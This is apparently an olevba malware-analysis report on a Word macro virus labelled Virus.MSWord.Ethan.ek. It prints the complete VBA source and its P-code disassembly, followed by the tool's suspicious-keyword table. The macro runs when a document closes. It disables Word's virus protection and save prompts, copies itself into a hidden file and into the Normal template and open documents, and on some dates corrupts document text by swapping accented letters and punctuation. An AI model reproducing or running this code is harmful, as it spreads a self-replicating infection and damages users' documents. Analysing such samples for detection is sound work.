olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.ek
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.ek - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

fName = "c:\captainL.$$$"
fAttr = 6

On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Randomize
With Options
  .ConfirmConversions = False
  .VirusProtection = False
  .SaveNormalPrompt = False
End With
'saving to disk
If Dir(fName, fAttr) = "" Then
  Set t = ActiveDocument.VBProject.VBComponents.Item(1)
  Set t = MacroContainer.VBProject.VBComponents.Item(1)
  Open fName For Output As #1
    For i = 1 To t.CodeModule.CountOfLines
      Print #1, t.CodeModule.Lines(i, 1)
    Next
  Close #1
  SetAttr fName, fAttr
End If

Set t1 = NormalTemplate.VBProject.VBComponents.Item(1)
Set t2 = ActiveDocument.VBProject.VBComponents.Item(1)

If t1.CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
  Set t = t1
ElseIf t2.CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
  Set t = t2
Else
  t = ""
End If

'dup
If t <> "" Then
  Open fName For Input As #1
  If LOF(1) <> 0 Then
    i = 1
    Do While Not EOF(1)
      Line Input #1, txt
      t.CodeModule.InsertLines i, txt
      i = i + 1
    Loop
  End If
  Close #1
End If

'action
sav = ActiveDocument.Saved
today = Day(Date)
If (Month(Date) < 4) Or (Month(Date) > 5) Then
  If today = 17 Then
  End If
  Set t = ActiveDocument.Characters
  If (Rnd < 0.321) And (today > 21) Then
    For i = 1 To t.Count
      ch = t.Item(i)
      If ch = "è" Then
        t.Item(i) = "à"
      ElseIf ch = "é" Then t.Item(i) = "e"
      ElseIf ch = "à" Then t.Item(i) = "a"
      ElseIf ch = "ì" Then t.Item(i) = "ù"
      ElseIf ch = "ò" Then t.Item(i) = "o"
      ElseIf ch = "ù" Then t.Item(i) = "ì"
      End If
    Next
  End If
  If (Rnd > 0.777) And (today < 5) Then
    For i = 1 To t.Count
      ch = t.Item(i)
      If ch = ":" Then
        t.Item(i) = "."
      ElseIf ch = "," Then t.Item(i) = " "
      ElseIf (ch = ".") And (Rnd < 0.5) Then t.Item(i) = "!"
      ElseIf ch = "!" Then t.Item(i) = "?"
      ElseIf ch = "?" Then t.Item(i) = "!"
      End If
    Next
  End If
End If

'update doc
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ActiveDocument.Saved = sav

End Sub

Private Sub Document_New()

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.ek
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8899 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	LitStr 0x000F "c:\captainL.$$$"
' 	St fName 
' Line #3:
' 	LitDI2 0x0006 
' 	St fAttr 
' Line #4:
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	ArgsCall Read 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #9:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #12:
' 	EndWith 
' Line #13:
' 	QuoteRem 0x0000 0x000E "saving to disk"
' Line #14:
' 	Ld fName 
' 	Ld fAttr 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #17:
' 	Ld fName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #20:
' 	StartForVariable 
' 	Next 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #22:
' 	Ld fName 
' 	Ld fAttr 
' 	ArgsCall SetAttr 0x0002 
' Line #23:
' 	EndIfBlock 
' Line #24:
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t1 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t2 
' Line #27:
' Line #28:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #29:
' 	SetStmt 
' 	Ld t1 
' 	Set t 
' Line #30:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	ElseIfBlock 
' Line #31:
' 	SetStmt 
' 	Ld t2 
' 	Set t 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	LitStr 0x0000 ""
' 	St t 
' Line #34:
' 	EndIfBlock 
' Line #35:
' Line #36:
' 	QuoteRem 0x0000 0x0003 "dup"
' Line #37:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #38:
' 	Ld fName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #39:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	St i 
' Line #41:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld txt 
' 	LineInput 
' Line #43:
' 	Ld i 
' 	Ld txt 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #44:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #45:
' 	Loop 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #48:
' 	EndIfBlock 
' Line #49:
' Line #50:
' 	QuoteRem 0x0000 0x0006 "action"
' Line #51:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St sav 
' Line #52:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St today 
' Line #53:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Lt 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #54:
' 	Ld today 
' 	LitDI2 0x0011 
' 	Eq 
' 	IfBlock 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	Set t 
' Line #57:
' 	Ld Rnd 
' 	LitR8 0x0625 0x9581 0x8B43 0x3FD4 
' 	Lt 
' 	Paren 
' 	Ld today 
' 	LitDI2 0x0015 
' 	Gt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd Count 
' 	For 
' Line #59:
' 	Ld i 
' 	Ld t 
' 	ArgsMemLd Item 0x0001 
' 	St ch 
' Line #60:
' 	Ld ch 
' 	LitStr 0x0001 "è"
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitStr 0x0001 "à"
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #62:
' 	Ld ch 
' 	LitStr 0x0001 "é"
' 	Eq 
' 	ElseIfBlock 
' 	LitStr 0x0001 "e"
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #63:
' 	Ld ch 
' 	LitStr 0x0001 "à"
' 	Eq 
' 	ElseIfBlock 
' 	LitStr 0x0001 "a"
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #64:
' 	Ld ch 
' 	LitStr 0x0001 "ì"
' 	Eq 
' 	ElseIfBlock 
' 	LitStr 0x0001 "ù"
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #65:
' 	Ld ch 
' 	LitStr 0x0001 "ò"
' 	Eq 
' 	ElseIfBlock 
' 	LitStr 0x0001 "o"
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #66:
' 	Ld ch 
' 	LitStr 0x0001 "ù"
' 	Eq 
' 	ElseIfBlock 
' 	LitStr 0x0001 "ì"
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	StartForVariable 
' 	Next 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Ld Rnd 
' 	LitR8 0xBE77 0x1A9F 0xDD2F 0x3FE8 
' 	Gt 
' 	Paren 
' 	Ld today 
' 	LitDI2 0x0005 
' 	Lt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd Count 
' 	For 
' Line #72:
' 	Ld i 
' 	Ld t 
' 	ArgsMemLd Item 0x0001 
' 	St ch 
' Line #73:
' 	Ld ch 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	IfBlock 
' Line #74:
' 	LitStr 0x0001 "."
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #75:
' 	Ld ch 
' 	LitStr 0x0001 ","
' 	Eq 
' 	ElseIfBlock 
' 	LitStr 0x0001 " "
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #76:
' 	Ld ch 
' 	LitStr 0x0001 "."
' 	Eq 
' 	Paren 
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' 	LitStr 0x0001 "!"
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #77:
' 	Ld ch 
' 	LitStr 0x0001 "!"
' 	Eq 
' 	ElseIfBlock 
' 	LitStr 0x0001 "?"
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #78:
' 	Ld ch 
' 	LitStr 0x0001 "?"
' 	Eq 
' 	ElseIfBlock 
' 	LitStr 0x0001 "!"
' 	Ld i 
' 	Ld t 
' 	ArgsMemSt Item 0x0001 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	StartForVariable 
' 	Next 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	EndIfBlock 
' Line #83:
' Line #84:
' 	QuoteRem 0x0000 0x000A "update doc"
' Line #85:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #86:
' 	Ld sav 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #87:
' Line #88:
' 	EndSub 
' Line #89:
' Line #90:
' 	FuncDefn (Private Sub Document_New())
' Line #91:
' Line #92:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

